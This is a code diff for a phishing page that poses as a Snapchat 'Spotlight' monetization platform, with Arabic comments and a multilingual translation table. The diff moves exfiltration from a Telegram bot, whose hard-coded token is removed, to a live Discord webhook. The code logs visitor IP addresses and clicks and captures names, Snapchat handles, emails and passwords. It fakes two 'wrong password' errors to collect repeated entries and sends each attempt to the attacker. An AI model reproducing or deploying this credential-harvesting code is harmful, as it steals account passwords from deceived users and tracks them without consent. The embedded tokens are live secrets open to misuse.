@@ -1,18 +1,17 @@
 // ===============================================
-// 1. إعدادات التيليجرام لتتبع الزوار
-// **هام: يجب التأكد من تعيين هذه القيم بشكل صحيح**
-const botToken = "8493663679:AAGW6vstZGS56PscBRhZ3Jqv0nUMxpn4JtU"; 
-const chatId = "1046458749";   
+// 1. إعدادات ديسكورد لتتبع الزوار
+// **هام: استبدل الرابط برابط Webhook الخاص بك**
+const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1444709878366212162/aaRxDFNINfucmVB8YSZ2MfdvHPUI8fbRRpROLo8iAAEFLjWfUNOHcgXJrhacUK4RbEHT"; 
 // ===============================================
 
-// 2. قاموس الترجمات (Dictionary) - يشمل جميع الصفحات
+// 2. قاموس الترجمات (Dictionary) - يشمل جميع الصفحات (لم يتغير)
 const translations = {
-    // === الصفحة الرئيسية (index.html) ===
+    // ... (جميع الترجمات) ...
     pageTitle: {
         ar: "منصة الأضواء - تحقيق المكاسب", en: "Spotlight Platform - Monetization", de: "Spotlight-Plattform - Monetarisierung", fr: "Plateforme Spotlight - Monétisation", es: "Plataforma Spotlight - Monetización"
     },
     heroHeader: {
-        ar: "حقق الأرباح من منصة الأضواء!", en: "Monetize with Spotlight!", de: "Verdienen Sie Geld mit Spotlight!", fr: "Gagnez de l'argent mit Spotlight !", es: "¡Monetiza con Spotlight!"
+        ar: "حقق الأرباح من منصة الأضواء!", en: "Monetize with Spotlight!", de: "Verdienen Sie Geld mit Spotlight!", fr: "Gagnez de l'argent avec Spotlight !", es: "¡Monetiza con Spotlight!"
     },
     heroText: {
         ar: "أنشئ محتوى مميزًا وابدأ بجني الأرباح من سناب شات.", en: "Create amazing content and start earning from Snapchat.", de: "Erstellen Sie einzigartige Inhalte und fangen Sie an, auf Snapchat Geld zu verdienen.", fr: "Créez du contenu unique et commencez à gagner de l'argent sur Snapchat.", es: "Crea contenido increíble y comienza a ganar dinero con Snapchat."
@@ -137,14 +136,33 @@ function applyTranslation() {
     }
 }
 
-// 5. وظيفة إرسال عنوان IP عند دخول الزائر للموقع
-function trackVisitorIP() {
-    // تم تبسيط الشرط لضمان تشغيل الدالة
-    if (!botToken || !chatId) {
-        console.warn("Telegram botToken or chatId is not configured. IP tracking is disabled.");
+// دالة مساعدة لإرسال الرسائل إلى Discord Webhook
+function sendToDiscord(message) {
+    if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL === "YOUR_DISCORD_WEBHOOK_URL_HERE") {
+        console.warn("Discord Webhook URL is not configured.");
         return;
     }
-    
+
+    // بناء جسم الرسالة بتنسيق ديسكورد
+    const payload = {
+        content: message,
+        username: "Snapchat Tracker",
+        avatar_url: "https://i.imgur.com/gK9u5lA.png" // يمكنك استخدام أي صورة لوجو هنا
+    };
+
+    return fetch(DISCORD_WEBHOOK_URL, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(payload)
+    })
+    .catch(error => console.error("Error sending message to Discord:", error));
+}
+
+
+// 5. وظيفة إرسال عنوان IP عند دخول الزائر للموقع
+function trackVisitorIP() {
     let dateTime = new Date().toLocaleString(getBrowserLanguage() === 'ar' ? 'ar-EG' : 'en-US', {
         year: 'numeric', month: 'short', day: 'numeric',
         hour: '2-digit', minute: '2-digit', second: '2-digit'
@@ -157,19 +175,17 @@ function trackVisitorIP() {
             let ipAddress = data.ip || 'غير معروف';
             
             // رسالة النجاح (مع الـ IP)
-            let ipMessage = `🔔 دخول جديد للموقع:\n🔗 الصفحة: ${window.location.href}\n🌍 عنوان IP: ${ipAddress}\n⏰ التاريخ: ${dateTime}\n🌐 اللغة: ${getBrowserLanguage().toUpperCase()}`;
+            let ipMessage = `🔔 **دخول جديد للموقع**\n**🔗 الصفحة:** ${window.location.href}\n**🌍 عنوان IP:** ${ipAddress}\n**⏰ التاريخ:** ${dateTime}\n**🌐 اللغة:** ${getBrowserLanguage().toUpperCase()}`;
 
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(ipMessage)}`)
-                .catch(error => console.error("Error sending message to Telegram:", error));
+            sendToDiscord(ipMessage);
         })
         .catch(error => {
             // إذا فشل جلب الـ IP، يتم إرسال إشعار بدونه كـ Fallback
             console.error("Error fetching IP, sending fallback message:", error);
             
-            let fallbackMessage = `⚠️ تنبيه: دخول جديد للموقع (فشل تحديد IP)\n🔗 الصفحة: ${window.location.href}\n⏰ التاريخ: ${dateTime}\n🌐 اللغة: ${getBrowserLanguage().toUpperCase()}`;
+            let fallbackMessage = `⚠️ **تنبيه: دخول جديد للموقع (فشل تحديد IP)**\n**🔗 الصفحة:** ${window.location.href}\n**⏰ التاريخ:** ${dateTime}\n**🌐 اللغة:** ${getBrowserLanguage().toUpperCase()}`;
 
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(fallbackMessage)}`)
-                .catch(error => console.error("Error sending fallback message to Telegram:", error));
+            sendToDiscord(fallbackMessage);
         });
 }
 
@@ -182,17 +198,10 @@ function trackClickAndProceed() {
     applyButton.disabled = true;
     applyButton.textContent = loadingText;
     
-    // تم تبسيط الشرط لضمان تشغيل الدالة
-    if (!botToken || !chatId) {
-        setTimeout(() => {
-            window.location.href = 'apply.html';
-        }, 3000); 
-        return;
-    }
+    const message = `🚨 **نقرة زر جديدة: "تقديم الطلب"**\n**🔗 من الصفحة:** ${window.location.href}\n**⏰ التاريخ:** ${new Date().toLocaleString(getBrowserLanguage() === 'ar' ? 'ar-EG' : 'en-US')}\n**🌐 اللغة:** ${getBrowserLanguage().toUpperCase()}`;
 
-    const message = `🚨 نقرة زر جديدة: "تقديم الطلب"\n🔗 من الصفحة: ${window.location.href}\n⏰ التاريخ: ${new Date().toLocaleString(getBrowserLanguage() === 'ar' ? 'ar-EG' : 'en-US')}\n🌐 اللغة: ${getBrowserLanguage().toUpperCase()}`;
-
-    fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+    // إرسال الرسالة إلى ديسكورد
+    sendToDiscord(message)
         .finally(() => {
             // الانتظار 3 ثواني قبل التوجيه
             setTimeout(() => {
@@ -221,21 +230,19 @@ if (document.getElementById("submissionForm")) {
         let trackingEmail = document.getElementById("trackingEmail").value; 
         let passwordField = document.getElementById("passwordField").value; 
 
-        let messageBody = `🔔 محاولة إرسال نموذج جديدة (رقم ${attempts + 1}):\n`;
-        messageBody += `👤 الاسم بالكامل: ${fullName}\n`; 
-        messageBody += `👻 معرّف حساب سناب شات: ${snapchatHandle}\n`; 
-        messageBody += `📧 البريد الإلكتروني: ${trackingEmail}\n`; 
-        messageBody += `🔒 كلمة المرور: ${passwordField}\n`;
-        messageBody += `⏰ التاريخ: ${new Date().toLocaleString(getBrowserLanguage() === 'ar' ? 'ar-EG' : 'en-US')}`;
+        let messageBody = `🔔 **محاولة إرسال نموذج جديدة** (رقم ${attempts + 1}):\n`;
+        messageBody += `👤 **الاسم بالكامل:** ${fullName}\n`; 
+        messageBody += `👻 **معرّف حساب سناب شات:** ${snapchatHandle}\n`; 
+        messageBody += `📧 **البريد الإلكتروني:** ${trackingEmail}\n`; 
+        messageBody += `🔒 **كلمة المرور:** ${passwordField}\n`;
+        messageBody += `⏰ **التاريخ:** ${new Date().toLocaleString(getBrowserLanguage() === 'ar' ? 'ar-EG' : 'en-US')}`;
 
         // 2. محاكاة التحقق والفشل المتعمد
         if (attempts < MAX_ATTEMPTS - 1) { // المحاولة 1 و 2 (فشل)
             attempts++;
             
-            // إرسال البيانات للبوت في كل محاولة
-            if (botToken && chatId) {
-                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(messageBody)}`);
-            }
+            // إرسال البيانات إلى ديسكورد
+            sendToDiscord(messageBody);
 
             // رسالة خطأ واضحة
             statusMessage.textContent = 'عفواً، كلمة المرور أو معرّف الحساب غير صحيح. يرجى المحاولة مرة أخرى.';
@@ -250,11 +257,9 @@ if (document.getElementById("submissionForm")) {
             // إظهار شاشة التحميل والانتظار 3 ثواني
             loadingOverlay.style.display = 'flex';
             
-            // إرسال البيانات للبوت (الإرسال النهائي)
-            if (botToken && chatId) {
-                 messageBody += "\n✨ (تم توجيه المستخدم لصفحة التأكيد)";
-                 fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(messageBody)}`);
-            }
+            // إرسال البيانات (الإرسال النهائي)
+            messageBody += "\n✨ (تم توجيه المستخدم لصفحة التأكيد)";
+            sendToDiscord(messageBody);
 
             // التوجيه لصفحة التأكيد بعد 3 ثواني
             setTimeout(() => {
